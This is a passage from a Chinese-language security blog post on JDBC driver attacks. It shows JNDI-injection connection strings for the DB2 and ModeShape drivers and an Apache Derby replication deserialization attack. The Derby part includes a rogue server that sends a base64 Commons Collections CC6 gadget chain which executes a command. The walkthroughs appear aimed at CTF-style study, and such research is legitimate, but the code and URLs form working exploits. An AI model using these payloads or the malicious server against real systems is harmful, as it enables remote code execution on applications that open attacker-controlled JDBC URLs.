class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693893680031-9403ded0-0bc0-4275-a49e-105cf32c1e4c.png#averageHue=%2342464e&clientId=u5b0ef69b-b84a-4&from=paste&height=1152&id=ud5bdcdd4&originHeight=1440&originWidth=1580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1906317&status=done&style=none&taskId=u3f10d53b-4623-4684-8a94-5368241f883&title=&width=1264" alt="image.png"></p>
+<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>入口点也是connect方法(com.ibm.db2.jcc)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693893760118-ece739dd-18e8-435f-aec7-7b943009f3b9.png#averageHue=%23484e54&clientId=u5b0ef69b-b84a-4&from=paste&height=916&id=uec1e5de0&originHeight=1145&originWidth=1566&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1586689&status=done&style=none&taskId=uf4418d2c-6298-4ca1-b807-76a2a9f21c0&title=&width=1252.8" alt="image.png"><br>然后一系列的预处理后就进入了run方法，run方法里面有lookup(com.ibm.db2.jcc.am)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693893800339-419a0e01-fc15-4cbc-8c93-e21847d48b7a.png#averageHue=%234b5056&clientId=u5b0ef69b-b84a-4&from=paste&height=931&id=u91e9909e&originHeight=1164&originWidth=1491&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1475602&status=done&style=none&taskId=u11120bc6-d976-4df5-beb8-0a3b642b5b2&title=&width=1192.8" alt="image.png"><br>然后自然就JNDI了</p>
+<h1 id="ModeShape-JDBC-JNDI-RCE"><a href="#ModeShape-JDBC-JNDI-RCE" class="headerlink" title="ModeShape JDBC JNDI RCE"></a>ModeShape JDBC JNDI RCE</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.modeshape<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>modeshape-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.4.1.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个也和上面的一样是JNDI注入。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.jdbc.ModeShape;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;org.modeshape.jdbc.LocalJcrDriver&quot;</span>);</span><br><span class="line">        DriverManager.getConnection(<span class="string">&quot;jdbc:jcr:jndi:ldap://127.0.0.1:1389/q2s3n8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693894374747-73112dc9-9cfc-4321-9790-1c6012155ca7.png#averageHue=%2343474e&clientId=u5b0ef69b-b84a-4&from=paste&height=1152&id=ue3593dc3&originHeight=1440&originWidth=1580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1649714&status=done&style=none&taskId=u4d618ced-e123-4abd-a43a-3017848c892&title=&width=1264" alt="image.png"></p>
+<h2 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h2><p>首先也是connect起步<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693894442077-94090fe8-e901-4950-9ee4-21cdc2b06e34.png#averageHue=%23484d55&clientId=u5b0ef69b-b84a-4&from=paste&height=850&id=u07026f2a&originHeight=1062&originWidth=1550&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1510774&status=done&style=none&taskId=uafdee79c-bd45-4d76-852a-9dd5173667f&title=&width=1240" alt="image.png"><br>其中<code>repositoryDelegate.createConnection</code>后续会做一些处理<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693894474495-3316e3c1-1e94-4bc3-b21e-58b81bef2e70.png#averageHue=%23474c54&clientId=u5b0ef69b-b84a-4&from=paste&height=785&id=u092cc744&originHeight=981&originWidth=1567&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1403861&status=done&style=none&taskId=u68e1295a-37da-4b60-88a4-b117f065919&title=&width=1253.6" alt="image.png"><br>initReposity方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693894491782-ff92f47d-1862-45c0-b24a-a63bf86ef007.png#averageHue=%23474c53&clientId=u5b0ef69b-b84a-4&from=paste&height=947&id=ud84894eb&originHeight=1184&originWidth=1598&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1668886&status=done&style=none&taskId=u9dcae44e-ae5c-4ce6-8a72-c0866ce1e99&title=&width=1278.4" alt="image.png"><br>lookup触发</p>
+<h1 id="Apache-Derby"><a href="#Apache-Derby" class="headerlink" title="Apache Derby"></a>Apache Derby</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.derby<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>derby<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>10.10.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>evilserver</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="comment">// 监听端口，默认 4444，可以指定</span></span><br><span class="line">	<span class="type">int</span>          <span class="variable">port</span>   <span class="operator">=</span> <span class="number">4444</span>;</span><br><span class="line">	<span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port);</span><br><span class="line">	<span class="type">Socket</span>       <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// CC6</span></span><br><span class="line">   	String evil=<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABxzcQB+ABN1cQB+ABgAAAACcHB0AAZpbnZva2V1cQB+ABwAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQABGNhbGN0AARleGVjdXEAfgAcAAAAAXEAfgAfc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AANiYmJ4&quot;</span>;</span><br><span class="line">       <span class="type">byte</span>[] decode = Base64.getDecoder().decode(evil);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 直接向 socket 中写入</span></span><br><span class="line">	socket.getOutputStream().write(decode);</span><br><span class="line">	socket.getOutputStream().flush();</span><br><span class="line">	Thread.sleep(TimeUnit.SECONDS.toMillis(<span class="number">5</span>));</span><br><span class="line">	socket.close();</span><br><span class="line">	server.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.jdbc.Derby;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;</span>);</span><br><span class="line">        <span class="comment">//DriverManager.getConnection(&quot;jdbc:derby:dbname;create=true&quot;);</span></span><br><span class="line">        DriverManager.getConnection(<span class="string">&quot;jdbc:derby:dbname;startMaster=true;slaveHost=127.0.0.1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先用create&#x3D;true创建一个。才可以进行下一步<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693895858404-538acc2c-dada-4d55-b5ae-03f83e41bca0.png#averageHue=%23494e55&clientId=u5b0ef69b-b84a-4&from=paste&height=885&id=u99519f10&originHeight=1106&originWidth=1634&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1327599&status=done&style=none&taskId=ue0fbe656-77d0-4be1-bb48-9b19d8234a6&title=&width=1307.2" alt="image.png"></p>
+<h2 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693895893632-1363c050-c933-4e39-bfd3-a2080171e771.png#averageHue=%2341474e&clientId=u5b0ef69b-b84a-4&from=paste&height=641&id=u80c3a32b&originHeight=801&originWidth=1551&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1109615&status=done&style=none&taskId=uc98e4e82-69c5-4781-9db2-7c1f6d8e377&title=&width=1240.8" alt="image.png"><br>在<code>ReplicationMessageTransmit$MasterReceiverThread</code>内部类中有一个readMessage方法，在进行连接时会直接反序列化数据流<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693896057052-f1855c8e-7c5d-4a42-b877-d53b1e56455e.png#averageHue=%23464a50&clientId=u5b0ef69b-b84a-4&from=paste&height=881&id=ueffdd69a&originHeight=1101&originWidth=1274&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1131999&status=done&style=none&taskId=u8acda363-5b7f-4ed5-b6fa-6458fc9dec7&title=&width=1019.2" alt="image.png"></p>
+<h1 id="SQLITE"><a href="#SQLITE" class="headerlink" title="SQLITE"></a>SQLITE</h1><p>这个我就不想多讲了，没有啥利用点基本，load_extension默认是关闭的，只可以进行SSRF，鸡肋。</p>
+<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>至此JDBC-ATTACK就告一段落了~</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CTF/" class="tag">#CTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/10/01/Weblogic%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0&amp;&amp;%E9%9B%86%E6%88%90Suo5%E9%80%BB%E8%BE%91/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Weblogic内存马学习&amp;&amp;集成Suo5逻辑</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/09/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%A0%94%E7%A9%B6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%20Writeup/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">华为杯 第二届中国研究生网络安全创新大赛 Writeup</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
